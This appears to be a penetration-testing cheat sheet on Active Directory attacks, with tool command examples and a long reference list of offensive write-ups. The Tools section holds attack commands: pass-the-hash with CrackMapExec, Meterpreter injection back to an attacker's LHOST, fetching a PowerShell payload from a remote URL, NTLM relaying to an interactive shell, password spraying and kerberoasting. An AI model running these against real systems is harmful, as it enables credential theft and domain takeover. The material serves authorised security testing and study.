# Active Directory Attacks

## Tools

* [Impacket](https://github.com/CoreSecurity/impacket) or the [Windows version](https://github.com/maaaaz/impacket-examples-windows)
* [Responder](https://github.com/lgandx/Responder)
* [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
* [Mimikatz](https://github.com/gentilkiwi/mimikatz)
* [Ranger](https://github.com/funkandwagnalls/ranger)
* [AdExplorer](https://docs.microsoft.com/en-us/sysinternals/downloads/adexplorer)
* [CrackMapExec](https://github.com/mpgn/CrackMapExec)

  ```powershell
  # use the latest release, CME is now a binary packaged will all its dependencies
  root@payload$ wget https://github.com/mpgn/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip

  # execute cme (smb, winrm, mssql, ...)
  root@payload$ cme smb -L
  root@payload$ cme smb -M name_module -o VAR=DATA
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
  root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
  root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
  root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
  root@payload$ cme mimikatz --server http --server-port 80
  ```

* [Mitm6](https://github.com/fox-it/mitm6.git)

  ```bash
  git clone https://github.com/fox-it/mitm6.git && cd mitm6
  pip install .
  mitm6 -d lab.local
  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
  # -wh: Server hosting WPAD file (Attacker’s IP)
  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
  # -i: open an interactive shell
  ntlmrelayx.py -t ldaps://lab.local -wh attacker-wpad --delegate-access
  ```

* [ADRecon](https://github.com/sense-of-security/ADRecon)

  ```powershell
  .\ADRecon.ps1 -DomainController MYAD.net -Credential MYAD\myuser
  ```

* [Active Directory Assessment and Privilege Escalation Script](https://github.com/hausec/ADAPE-Script)

    ```powershell
    powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
    ```

* [Ping Castle](https://github.com/vletoux/pingcastle)

    ```powershell
    pingcastle.exe --healthcheck --server <DOMAIN_CONTROLLER_IP> --user <USERNAME> --password <PASSWORD> --advanced-live --nullsession
    pingcastle.exe --healthcheck --server domain.local
    pingcastle.exe --graph --server domain.local
    pingcastle.exe --scanner scanner_name --server domain.local
    available scanners are:aclcheck,antivirus,computerversion,foreignusers,laps_bitlocker,localadmin,nullsession,nullsession-trust,oxidbindings,remote,share,smb,smb3querynetwork,spooler,startup,zerologon,computers,users
    ```

* [Kerbrute](https://github.com/ropnop/kerbrute)

    ```powershell
    ./kerbrute passwordspray -d <DOMAIN> <USERS.TXT> <PASSWORD>
    ```

* [Rubeus](https://github.com/GhostPack/Rubeus)

    ```powershell
    Rubeus.exe asktgt /user:USER </password:PASSWORD [/enctype:DES|RC4|AES128|AES256] | /des:HASH | /rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ptt] [/luid]
    Rubeus.exe dump [/service:SERVICE] [/luid:LOGINID]
    Rubeus.exe klist [/luid:LOGINID]
    Rubeus.exe kerberoast [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]
    ```

* [AutomatedLab](https://github.com/AutomatedLab/AutomatedLab)
    ```powershell
    New-LabDefinition -Name GettingStarted -DefaultVirtualizationEngine HyperV
    Add-LabMachineDefinition -Name FirstServer -OperatingSystem 'Windows Server 2016 SERVERSTANDARD'
    Install-Lab
    Show-LabDeploymentSummary
    ```


## References

* [Explain like I’m 5: Kerberos - Apr 2, 2013 - @roguelynn](https://www.roguelynn.com/words/explain-like-im-5-kerberos/)
* [Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter](https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/)
* [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
* [Abusing Kerberos: Kerberoasting - Haboob Team](https://www.exploit-db.com/docs/english/45051-abusing-kerberos---kerberoasting.pdf)
* [Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid](https://alsid.com/company/news/abusing-s4u2self-another-sneaky-active-directory-persistence)
* [Attacks Against Windows PXE Boot Images - February 13th, 2018 - Thomas Elling](https://blog.netspi.com/attacks-against-windows-pxe-boot-images/)
* [BUILDING AND ATTACKING AN ACTIVE DIRECTORY LAB WITH POWERSHELL - @myexploit2600 & @5ub34x](https://1337red.wordpress.com/building-and-attacking-an-active-directory-lab-with-powershell/)
* [Becoming Darth Sidious: Creating a Windows Domain (Active Directory) and hacking it - @chryzsh](https://chryzsh.gitbooks.io/darthsidious/content/building-a-lab/building-a-lab/building-a-small-lab.html)
* [BlueHat IL - Benjamin Delpy](https://microsoftrnd.co.il/Press%20Kit/BlueHat%20IL%20Decks/BenjaminDelpy.pdf)
* [COMPROMISSION DES POSTES DE TRAVAIL GRÂCE À LAPS ET PXE MISC n° 103 - mai 2019 - Rémi Escourrou, Cyprien Oger ](https://connect.ed-diamond.com/MISC/MISC-103/Compromission-des-postes-de-travail-grace-a-LAPS-et-PXE)
* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
* [DiskShadow The return of VSS Evasion Persistence and AD DB extraction](https://bohops.com/2018/03/26/diskshadow-the-return-of-vss-evasion-persistence-and-active-directory-database-extraction/)
* [Domain Penetration Testing: Using BloodHound, Crackmapexec, & Mimikatz to get Domain Admin](https://hausec.com/2017/10/21/domain-penetration-testing-using-bloodhound-crackmapexec-mimikatz-to-get-domain-admin/)
* [Dumping Domain Password Hashes - Pentestlab](https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/)
* [Exploiting MS14-068 with PyKEK and Kali - 14 DEC 2014 - ZACH GRACE @ztgrace](https://zachgrace.com/posts/exploiting-ms14-068/)
* [Exploiting PrivExchange - April 11, 2019 - @chryzsh](https://chryzsh.github.io/exploiting-privexchange/)
* [Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019](https://www.riccardoancarani.it/exploiting-unconstrained-delegation/)
* [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
* [How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf](https://adsecurity.org/?p=2011)
* [Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
* [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
* [Getting the goods with CrackMapExec: Part 2, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-2.html)
* [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
* [How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff](https://bluescreenofjeff.com/2017-05-23-how-to-pass-the-ticket-through-ssh-tunnels/)
* [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts - Roberto Rodriguez - Nov 28, 2018](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
* [Invoke-Kerberoast - Powersploit Read the docs](https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/)
* [Kerberoasting - Part 1 - Mubix “Rob” Fuller](https://room362.com/post/2016/kerberoast-pt1/)
* [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
* [Pen Testing Active Directory Environments - Part I: Introduction to crackmapexec (and PowerView)](https://blog.varonis.com/pen-testing-active-directory-environments-part-introduction-crackmapexec-powerview/)
* [Pen Testing Active Directory Environments - Part II: Getting Stuff Done With PowerView](https://blog.varonis.com/pen-testing-active-directory-environments-part-ii-getting-stuff-done-with-powerview/)
* [Pen Testing Active Directory Environments - Part III:  Chasing Power Users](https://blog.varonis.com/pen-testing-active-directory-environments-part-iii-chasing-power-users/)
* [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
* [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
* [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
* [Penetration Testing Active Directory, Part I - March 5, 2019 - Hausec](https://hausec.com/2019/03/05/penetration-testing-active-directory-part-i/)
* [Penetration Testing Active Directory, Part II - March 12, 2019 - Hausec](https://hausec.com/2019/03/12/penetration-testing-active-directory-part-ii/)
* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
* [Quick Guide to Installing Bloodhound in Kali-Rolling - James Smith](https://stealingthe.network/quick-guide-to-installing-bloodhound-in-kali-rolling/)
* [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
* [Roasting AS-REPs - January 17, 2017 - harmj0y](https://www.harmj0y.net/blog/activedirectory/roasting-as-reps/)
* [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
* [Using bloodhound to map the user network - Hausec](https://hausec.com/2017/10/26/using-bloodhound-to-map-the-user-network/)
* [WHAT’S SPECIAL ABOUT THE BUILTIN ADMINISTRATOR ACCOUNT? - 21/05/2012 - MORGAN SIMONSEN](https://morgansimonsen.com/2012/05/21/whats-special-about-the-builtin-administrator-account-12/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 1](https://akerva.com/blog/wonkachall-akerva-ndh-2018-write-up-part-1/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 2](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-2/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 3](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-3/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 4](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-4/)
* [WONKACHALL AKERVA NDH2018 – WRITE UP PART 5](https://akerva.com/blog/wonkachall-akerva-ndh2018-write-up-part-5/)
* [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019](https://posts.specterops.io/a-case-study-in-wagging-the-dog-computer-takeover-2bcb7f94c783)
* [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
* [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy - March 16, 2017 - harmj0y](http://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
* [Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY PÉREZ](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory -  Sean Metcalf](https://adsecurity.org/?p=3592)
* [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
* [Taming the Beast Assess Kerberos-Protected Networks - Emmanuel Bouillon](https://www.blackhat.com/presentations/bh-europe-09/Bouillon/BlackHat-Europe-09-Bouillon-Taming-the-Beast-Kerberous-slides.pdf)
* [Playing with Relayed Credentials - June 27, 2018](https://www.secureauth.com/blog/playing-relayed-credentials)
* [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
* [Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019](https://blog.preempt.com/drop-the-mic)
* [How to build a SQL Server Virtual Lab with AutomatedLab in Hyper-V - October 30, 2017 - Craig Porteous](https://www.sqlshack.com/build-sql-server-virtual-lab-automatedlab-hyper-v/)
* [SMB Share – SCF File Attacks - December 13, 2017 - @netbiosX](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
* [Escalating privileges with ACLs in Active Directory - April 26, 2018 - Rindert Kramer and Dirk-jan Mollema](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
* [A Red Teamer’s Guide to GPOs and OUs - APRIL 2, 2018 - @_wald0](https://wald0.com/?p=179)
* [Carlos Garcia - Rooted2019 - Pentesting Active Directory Forests public.pdf](https://www.dropbox.com/s/ilzjtlo0vbyu1u0/Carlos%20Garcia%20-%20Rooted2019%20-%20Pentesting%20Active%20Directory%20Forests%20public.pdf?dl=0)
* [Kerberosity Killed the Domain: An Offensive Kerberos Overview - Ryan Hausknecht - Mar 10](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
* [Active-Directory-Exploitation-Cheat-Sheet - @buftas](https://github.com/buftas/Active-Directory-Exploitation-Cheat-Sheet#local-privilege-escalation)
* [GPO Abuse - Part 1 - RastaMouse - 6 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [GPO Abuse - Part 2 - RastaMouse - 13 January 2019](https://rastamouse.me/2019/01/gpo-abuse-part-2/)
* [Abusing GPO Permissions - harmj0y - March 17, 2016](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [How To Attack Kerberos 101 - m0chan - July 31, 2019](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html)
* [ACE to RCE - @JustinPerdok - July 24, 2020](https://sensepost.com/blog/2020/ace-to-rce/)
* [Zerologon:Unauthenticated domain controller compromise by subverting Netlogon cryptography (CVE-2020-1472) - Tom Tervoort, September 2020](https://www.secura.com/pathtoimg.php?id=2055)
* [Access Control Entries (ACEs) - The Hacker Recipes - @_nwodtuhs](https://www.thehacker.recipes/active-directory-domain-services/movement/abusing-aces)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Practical Exploitation - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
* [CVE-2020-17049: Kerberos Bronze Bit Attack – Theory - Jake Karnes - December 8th, 2020](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/)
* [Kerberos Bronze Bit Attack (CVE-2020-17049) Scenarios to Potentially Compromise Active Directory](https://www.hub.trimarcsecurity.com/post/leveraging-the-kerberos-bronze-bit-attack-cve-2020-17049-scenarios-to-compromise-active-directory)
* [GPO Abuse: "You can't see me" - Huy Kha -  July 19, 2019](https://pentestmag.com/gpo-abuse-you-cant-see-me/)
* [Lateral movement via dcom: round 2 - enigma0x3 - January 23, 2017](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology - Philip Tsukerman - Jan 25, 2018](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
* [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
* [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
* [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
* [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
* [Microsoft ADCS – Abusing PKI in Active Directory Environment - Jean MARSAULT - 14/06/2021](https://www.riskinsight-wavestone.com/en/2021/06/microsoft-adcs-abusing-pki-in-active-directory-environment/)
* [Certified Pre-Owned - Will Schroeder and Lee Christensen - June 17, 2021](http://www.harmj0y.net/blog/activedirectory/certified-pre-owned/)
* [NTLM relaying to AD CS - On certificates, printers and a little hippo - Dirk-jan Mollema](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [Certified Pre-Owned Abusing Active Directory Certificate Services - @harmj0y @tifkin_](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-Certified-Pre-Owned-Abusing-Active-Directory-Certificate-Services.pdf)
* [Certified Pre-Owned - Will Schroeder - Jun 17 2021](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
* [AD CS/PKI template exploit via PetitPotam and NTLMRelayx, from 0 to DomainAdmin in 4 steps by frank | Jul 23, 2021](https://www.bussink.net/ad-cs-exploit-via-petitpotam-from-0-to-domain-domain/)
* [NTLMv1_Downgrade.md - S3cur3Th1sSh1t - 09/07/2021](https://gist.github.com/S3cur3Th1sSh1t/0c017018c2000b1d5eddf2d6a194b7bb)
* [UnPAC the hash - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/unpac-the-hash)
* [Lateral Movement – WebClient](https://pentestlab.blog/2021/10/20/lateral-movement-webclient/)
* [Shadow Credentials: Workstation Takeover Edition - Matthew Creel](https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition)
* [Certificate templates - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/certificate-templates)
* [CA configuration - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/ca-configuration)
* [Access controls - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls)
* [Web endpoints - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/ad-cs/web-endpoints)
* [sAMAccountName spoofing - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
* [CVE-2021-42287/CVE-2021-42278 Weaponisation - @exploitph](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)
* [ADCS: Playing with ESC4 - Matthew Creel](https://www.fortalicesolutions.com/posts/adcs-playing-with-esc4)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [AD CS: weaponizing the ESC7 attack - Kurosh Dabbagh - 26 January, 2022](https://www.blackarrow.net/adcs-weaponizing-esc7-attack/)
* [AD CS: from ManageCA to RCE - 11 February, 2022 - Pablo Martínez, Kurosh Dabbagh](https://www.blackarrow.net/ad-cs-from-manageca-to-rce/)
* [Introducing the Golden GMSA Attack - YUVAL GORDON - March 01, 2022](https://www.semperis.com/blog/golden-gmsa-attack/)
* [Introducing MalSCCM - Phil Keeble -May 4, 2022](https://labs.nettitude.com/blog/introducing-malsccm/)
* [Certifried: Active Directory Domain Privilege Escalation (CVE-2022–26923) - Oliver Lyak](https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4)
* [bloodyAD and CVE-2022-26923 - soka - 11 May 2022](https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html)
* [DIVING INTO PRE-CREATED COMPUTER ACCOUNTS - May 10, 2022 - By Oddvar Moe](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/)
* [How NOT to use the PAM trust - Leveraging Shadow Principals for Cross Forest Attacks - Thursday, April 18, 2019 - Nikhil SamratAshok Mittal](http://www.labofapenetrationtester.com/2019/04/abusing-PAM.html)
* [Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
* [Network Access Accounts are evil… - ROGER ZANDER - 13 SEP 2015](https://rzander.azurewebsites.net/network-access-accounts-are-evil/)
* [The Phantom Credentials of SCCM: Why the NAA Won’t Die - Duane Michael - Jun 28](https://posts.specterops.io/the-phantom-credentials-of-sccm-why-the-naa-wont-die-332ac7aa1ab9)
* [Diamond tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/diamond)
* [A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022](https://www.semperis.com/blog/a-diamond-ticket-in-the-ruff/)
* [Sapphire tickets - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/sapphire)
* [Exploiting RBCD Using a Normal User Account - tiraniddo.dev - Friday, 13 May 2022](https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
* [Exploring SCCM by Unobfuscating Network Access Accounts - @_xpn_ - Posted on 2022-07-09](https://blog.xpnsec.com/unobfuscating-network-access-accounts/)
* [.NET Advanced Code Auditing XmlSerializer Deserialization Vulnerability - April 2, 2019 by znlive](https://znlive.com/xmlserializer-deserialization-vulnerability)
* [Practical guide for Golden SAML - Practical guide step by step to create golden SAML](https://nodauf.dev/p/practical-guide-for-golden-saml/)
* [Relaying to AD Certificate Services over RPC - NOVEMBER 16, 2022 - SYLVAIN HEINIGER](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
* [I AM AD FS AND SO CAN YOU - Douglas Bienstock & Austin Baker - Mandiant](https://troopers.de/downloads/troopers19/TROOPERS19_AD_AD_FS.pdf)
* [Hunt for the gMSA secrets - Dr Nestori Syynimaa (@DrAzureAD) - August 29, 2022](https://aadinternals.com/post/gmsa/)
* [Relaying NTLM Authentication from SCCM Clients - Chris Thompson - Jun 30, 2022](https://posts.specterops.io/relaying-ntlm-authentication-from-sccm-clients-7dccb8f92867)
* [Poc’ing Beyond Domain Admin - Part 1 - cube0x0](https://cube0x0.github.io/Pocing-Beyond-DA/)
* [At the Edge of Tier Zero: The Curious Case of the RODC - Elad Shamir](https://posts.specterops.io/at-the-edge-of-tier-zero-the-curious-case-of-the-rodc-ef5f1799ca06)
* [Attacking Read-Only Domain Controllers (RODCs) to Own Active Directory - Sean Metcalf](https://adsecurity.org/?p=3592)
* [The Kerberos Key List Attack: The return of the Read Only Domain Controllers - Leandro Cuozzo](https://www.secureauth.com/blog/the-kerberos-key-list-attack-the-return-of-the-read-only-domain-controllers/)
* [Timeroasting: Attacking Trust Accounts in Active Directory - Tom Tervoort - 01 March 2023](https://www.secura.com/blog/timeroasting-attacking-trust-accounts-in-active-directory)
* [TIMEROASTING, TRUSTROASTING AND COMPUTER SPRAYING WHITE PAPER - Tom Tervoort](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
* [Beyond LLMNR/NBNS Spoofing – Exploiting Active Directory-Integrated DNS - July 10, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
* [ADIDNS Revisited – WPAD, GQBL, and More - December 5, 2018 | Kevin Robertson](https://www.netspi.com/blog/technical/network-penetration-testing/adidns-revisited/)
* [Getting in the Zone: dumping Active Directory DNS using adidnsdump - Dirk-jan Mollema](https://blog.fox-it.com/2019/04/25/getting-in-the-zone-dumping-active-directory-dns-using-adidnsdump/)
* [S4U2self abuse - TheHackerRecipes](https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse)
* [Abusing Kerberos S4U2self for local privilege escalation - cfalta](https://cyberstoph.org/posts/2021/06/abusing-kerberos-s4u2self-for-local-privilege-escalation/)
* [External Trusts Are Evil - 14 March 2023 - Charlie Clark (@exploitph)](https://exploit.ph/external-trusts-are-evil.html)
* [Certificates and Pwnage and Patches, Oh My! - Will Schroeder - Nov 9, 2022](https://posts.specterops.io/certificates-and-pwnage-and-patches-oh-my-8ae0f4304c1d)
